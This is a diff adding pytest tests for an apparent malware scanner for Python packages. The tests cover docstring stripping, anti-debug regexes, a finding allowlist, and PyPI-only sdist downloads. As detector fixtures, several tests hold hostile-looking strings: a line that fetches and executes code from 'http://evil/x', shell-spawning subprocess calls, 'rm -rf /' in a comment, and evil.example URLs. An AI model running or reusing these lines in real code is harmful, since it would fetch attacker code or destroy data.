@@ -244,3 +244,316 @@ def test_archive_corruption_produces_critical_finding(tmp_path):
         "no archive_corrupted finding on corrupt tarball; got "
         f"{[(f.severity, f.check) for f in findings_tar]}"
     )
+
+
+# ---------------------------------------------------------------------------
+# False-positive hardening: code-only scanning via _strip_noncode.
+# ---------------------------------------------------------------------------
+
+
+def test_strip_noncode_blanks_docstrings_and_comments_keeps_geometry():
+    src = (
+        '"""Module doc mentions subprocess.Popen and reverse shell."""\n'
+        "x = 1  # os.system('rm -rf /') in a comment\n"
+        "def f():\n"
+        "    '''calls eval() and exec() in prose'''\n"
+        "    return x\n"
+    )
+    out = sp._strip_noncode(src)
+    # Line geometry is byte-stable so evidence L<n> stays correct.
+    assert len(out.splitlines()) == len(src.splitlines())
+    # The dangerous-looking tokens lived only in docstrings/comments -> gone.
+    for needle in ("subprocess", "os.system", "eval(", "exec(", "reverse shell"):
+        assert needle not in out, needle
+    # Real code survives.
+    assert "x = 1" in out
+    assert "return x" in out
+
+
+def test_strip_noncode_preserves_real_code_and_assigned_strings():
+    src = (
+        "import subprocess\n"
+        "subprocess.Popen(['/bin/sh', '-c', 'id'])\n"
+        "exec(open('x').read())\n"
+        "BLOB = '" + ("A" * 64) + "'\n"  # assigned string is code, not a docstring
+    )
+    out = sp._strip_noncode(src)
+    assert out == src, "real code (incl. RHS string literals) must be untouched"
+
+
+def test_strip_noncode_falls_back_on_syntax_error():
+    broken = "def f(:\n    pass  # not valid python\n"
+    # Must not raise; returns the original so the content is still scanned.
+    assert sp._strip_noncode(broken) == broken
+
+
+def test_check_py_file_ignores_docstring_only_iocs():
+    # A file whose ONLY dangerous patterns live in a docstring must be clean.
+    benign = (
+        '"""Usage:\n'
+        ">>> import subprocess, urllib.request\n"
+        ">>> subprocess.Popen(['sh','-c','id'])\n"
+        ">>> exec(urllib.request.urlopen('http://evil/x').read())\n"
+        '"""\n'
+        "VERSION = '1.0'\n"
+    )
+    findings = sp.check_py_file(benign, "pkg/_doc.py", "pkg")
+    assert findings == [], f"docstring IOCs should not flag: {[str(f) for f in findings]}"
+    # But the same payload as real code still flags.
+    real = (
+        "import subprocess, urllib.request\n"
+        "subprocess.Popen(['sh','-c','id'])\n"
+        "exec(urllib.request.urlopen('http://evil/x').read())\n"
+    )
+    flagged = sp.check_py_file(real, "pkg/evil.py", "pkg")
+    assert any(f.severity in (sp.CRITICAL, sp.HIGH) for f in flagged)
+
+
+def test_extract_evidence_multiline_reports_line():
+    # A DOTALL pattern that only matches across lines must still yield evidence
+    # (not an empty string) so a baseline entry is reviewable.
+    content = "a = 1\ntime.sleep(\n    600\n)\n"
+    ev = sp._extract_evidence(content, sp.RE_ANTI_ANALYSIS)
+    assert ev and ev.startswith("L"), ev
+
+
+def test_anti_analysis_no_longer_flags_cross_platform_code():
+    # Pure cross-platform code (the old platform.system FP) must be clean.
+    crossplat = (
+        "import platform, subprocess\n"
+        "if platform.system() == 'Windows':\n"
+        "    subprocess.run(['where', 'git'])\n"
+        "else:\n"
+        "    subprocess.run(['which', 'git'])\n"
+    )
+    findings = sp.check_py_file(crossplat, "pkg/_compat.py", "pkg")
+    anti = [f for f in findings if "Anti-analysis" in f.check]
+    assert anti == [], f"cross-platform code should not be anti-analysis: {anti}"
+
+
+def test_proc_self_status_read_flags_anti_analysis():
+    # Reading /proc/self/status (to scrape TracerPid) alongside a subprocess
+    # call is the classic anti-debug combination. The old `\b/proc/self/status\b`
+    # was a dead pattern (\b adjacent to "/" is unsatisfiable); the lookbehind
+    # fix makes it fire. No TracerPid/ptrace token here so only the /proc path
+    # can supply the anti-analysis signal.
+    payload = (
+        "import subprocess\n"
+        "with open('/proc/self/status') as fh:\n"
+        "    data = fh.read()\n"
+        "subprocess.run(['echo', 'go'])\n"
+    )
+    findings = sp.check_py_file(payload, "pkg/_probe.py", "pkg")
+    anti = [f for f in findings if "Anti-analysis" in f.check]
+    assert anti, "reading /proc/self/status + subprocess must flag anti-analysis"
+    assert anti[0].severity == sp.HIGH
+
+
+def test_proc_self_status_pattern_is_live():
+    # Direct regex check across the common call forms; the leading \b made all
+    # of these unsatisfiable before the fix.
+    for s in (
+        'open("/proc/self/status")',
+        "cat /proc/self/status",
+        "path = '/proc/self/status'",
+    ):
+        assert sp.RE_ANTI_ANALYSIS.search(s), s
+    # A bare cross-platform OS check must still NOT match anti-analysis.
+    assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")
+
+
+# ---------------------------------------------------------------------------
+# Baseline allowlist.
+# ---------------------------------------------------------------------------
+
+
+def _mk(sev, pkg, fname, check):
+    return sp.Finding(sev, pkg, fname, check, "evidence")
+
+
+def test_baseline_key_is_version_stable_basename():
+    a = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/sessions.py", "X")
+    b = _mk(sp.CRITICAL, "Requests", "requests-3.0.0/requests/sessions.py", "X")
+    # Normalized package + basename + check -> same key across version bumps.
+    assert sp._finding_key(a) == sp._finding_key(b)
+
+
+def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
+    bl = tmp_path / "bl.json"
+    listed = _mk(sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected")
+    sp._write_baseline(str(bl), [listed])
+    baseline = sp._load_baseline(str(bl))
+
+    # Same (package, basename, check) -> suppressed.
+    active, suppressed = sp._partition_baseline([listed], baseline)
+    assert suppressed == [listed] and active == []
+
+    # A NEW kind of finding in the SAME file is a different check -> still active.
+    new_kind = _mk(sp.CRITICAL, "fastapi", "fastapi/routing.py", "Reverse shell / bind shell pattern")
+    active2, suppressed2 = sp._partition_baseline([new_kind], baseline)
+    assert active2 == [new_kind] and suppressed2 == []
+
+
+def test_write_baseline_roundtrip_only_crit_high(tmp_path):
+    bl = tmp_path / "bl.json"
+    findings = [
+        _mk(sp.CRITICAL, "p", "a.py", "c1"),
+        _mk(sp.HIGH, "p", "b.py", "c2"),
+        _mk(sp.MEDIUM, "p", "c.py", "c3"),  # MEDIUM excluded from baseline
+    ]
+    sp._write_baseline(str(bl), findings)
+    keys = sp._load_baseline(str(bl))
+    assert sp._finding_key(findings[0]) in keys
+    assert sp._finding_key(findings[1]) in keys
+    assert sp._finding_key(findings[2]) not in keys
+
+
+def test_load_baseline_missing_file_is_empty():
+    assert sp._load_baseline("/nonexistent/path/bl.json") == set()
+
+
+# ---------------------------------------------------------------------------
+# sdist fallback: preserve coverage of sdist-only packages without building.
+# All offline -- PyPI JSON / download are mocked.
+# ---------------------------------------------------------------------------
+
+
+class _FakeResp:
+    """Minimal urlopen() context-manager stand-in."""
+
+    def __init__(self, data: bytes = b"", status: int = 200):
+        self._data = data
+        self.status = status
+
+    def read(self, n: int = -1) -> bytes:
+        return self._data
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *a):
+        return False
+
+
+def _f(packagetype: str, filename: str, url: str) -> dict:
+    return {"packagetype": packagetype, "filename": filename, "url": url}
+
+
+def _meta(files: list[dict], requires=None, version: str = "1.0.0") -> dict:
+    return {
+        "info": {"version": version, "requires_dist": requires or []},
+        "urls": files,
+        "releases": {version: files},
+    }
+
+
+def test_spec_pin_version():
+    assert sp._spec_pin_version("torch==2.3.1") == "2.3.1"
+    assert sp._spec_pin_version("torch>=2.0") is None
+    assert sp._spec_pin_version("numpy") is None
+
+
+def test_release_has_wheel_detects_sdist_only():
+    sdist_only = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
+    assert sp._release_has_wheel(sdist_only, None) is False
+    assert sp._release_has_wheel(sdist_only, "1.0.0") is False
+    has_wheel = _meta(
+        [
+            _f("sdist", "x.tar.gz", "https://files.pythonhosted.org/x.tar.gz"),
+            _f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl"),
+        ]
+    )
+    assert sp._release_has_wheel(has_wheel, None) is True
+
+
+def test_is_trusted_pypi_url_only_https_pypi():
+    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org/p/x.tar.gz") is True
+    assert sp._is_trusted_pypi_url("https://pypi.org/x.tar.gz") is True
+    assert sp._is_trusted_pypi_url("http://files.pythonhosted.org/x.tar.gz") is False  # not https
+    assert sp._is_trusted_pypi_url("https://evil.example/x.tar.gz") is False
+    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org.evil.com/x") is False
+
+
+def test_requires_dist_skips_extras():
+    meta = _meta(
+        [],
+        requires=[
+            "numpy (>=1.20)",
+            "torch ; extra == 'dev'",  # optional extra -> skipped
+            "pyyaml>=5 ; python_version >= '3.8'",  # non-extra marker -> kept
+        ],
+    )
+    names = sp._requires_dist_names(meta, None)
+    assert "numpy" in names
+    assert "pyyaml" in names
+    assert "torch" not in names
+
+
+def test_download_sdist_direct_refuses_non_pypi_url(tmp_path):
+    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://evil.example/x.tar.gz")])
+    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta=meta)
+    assert fpath is None and "non-PyPI" in err
+    assert list(tmp_path.iterdir()) == []  # nothing was written
+
+
+def test_download_sdist_direct_no_sdist_published(tmp_path):
+    meta = _meta([_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")])
+    fpath, err = sp._download_sdist_direct("x", None, str(tmp_path), meta=meta)
+    assert fpath is None and "no sdist" in err
+
+
+def test_download_sdist_direct_writes_and_preserves_suffix(tmp_path, monkeypatch):
+    payload = b"\x1f\x8b" + b"fake-tar-gz-bytes"
+    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout=0: _FakeResp(payload))
+    meta = _meta(
+        [_f("sdist", "langid-1.1.6.tar.gz", "https://files.pythonhosted.org/langid-1.1.6.tar.gz")]
+    )
+    fpath, err = sp._download_sdist_direct("langid", "1.1.6", str(tmp_path), meta=meta)
+    assert err is None and fpath is not None
+    assert fpath.endswith(".tar.gz")  # suffix preserved -> archive reader picks format
+    assert Path(fpath).read_bytes() == payload
+
+
+def test_download_sdist_direct_size_cap(tmp_path, monkeypatch):
+    monkeypatch.setattr(sp, "_MAX_SDIST_BYTES", 8)
+    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout=0: _FakeResp(b"x" * 100))
+    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
+    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta=meta)
+    assert fpath is None and "cap" in err
+
+
+def test_per_spec_genuine_failure_is_recorded_error(tmp_path, monkeypatch):
+    # A spec that fails pip but HAS a wheel on PyPI is a genuine error (-> exit 2),
+    # never silently swallowed.
+    class _Proc:
+        returncode = 1
+        stderr = "ResolutionImpossible"
+
+    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
+    monkeypatch.setattr(
+        sp, "_pypi_json",
+        lambda name: _meta([_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")]),
+    )
+    errors: list[str] = []
+    sp._resolve_per_spec_with_deps(["somepkg==1.0"], str(tmp_path), {}, errors)
+    assert errors and "somepkg" in errors[0]
+
+
+def test_per_spec_sdist_only_is_not_error(tmp_path, monkeypatch):
+    # sdist-only spec: pip fails, PyPI shows no wheel -> direct fetch, no error.
+    class _Proc:
+        returncode = 1
+        stderr = "No matching distribution"
+
+    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
+    monkeypatch.setattr(
+        sp, "_pypi_json",
+        lambda name: _meta(
+            [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x-1.0.0.tar.gz")]
+        ),
+    )
+    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout=0: _FakeResp(b"\x1f\x8bdata"))
+    errors: list[str] = []
+    sp._resolve_per_spec_with_deps(["x==1.0.0"], str(tmp_path), {}, errors)
+    assert errors == []  # sdist-only handled, not an exit-2 failure
+    assert any(p.name.endswith(".tar.gz") for p in tmp_path.iterdir())
